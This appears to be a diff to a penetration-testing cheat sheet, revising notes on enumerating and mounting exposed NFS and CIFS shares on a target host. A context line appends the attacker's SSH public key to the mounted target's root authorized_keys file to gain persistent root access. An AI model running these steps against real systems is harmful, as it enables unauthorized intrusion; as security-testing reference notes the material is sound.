@@ -338,13 +338,18 @@ Write changes to a file and quit
 
 showmount -e <target IP>
 
-mkdir /mnt/tmp/
-mount -t nfs -o nolock <target IP>:/share /mnt/tmp/
+mkdir /mnt/nfs/
+mount -t nfs -o nolock <target IP>:/share /mnt/nfs/
+------------------------------------------------------------------------------------------------------
 
-OS X: mount -t cifs //<target IP>:Users/<user name> /mnt/tmp/ -o user=<user name>,pass=<password>,nounix,sec=ntlmssp
+# CIFS Shares Anonymous Mountable
+
+mkdir /mnt/cifs/
+mount -t cifs -o username=user,domain=foo //<target IP>/share /mnt/cifs
+
+OS X: mount -t cifs //<target IP>:Users/<user> /mnt/cifs/ -o user=<user>,pass=<password>,nounix,sec=ntlmssp
 
 cat /root/.ssh/id_rsa.pub >> /tmp/mount/root/.ssh/authorized_keys
-umount /tmp/mount
 ------------------------------------------------------------------------------------------------------
 
 # Rstatd enabled
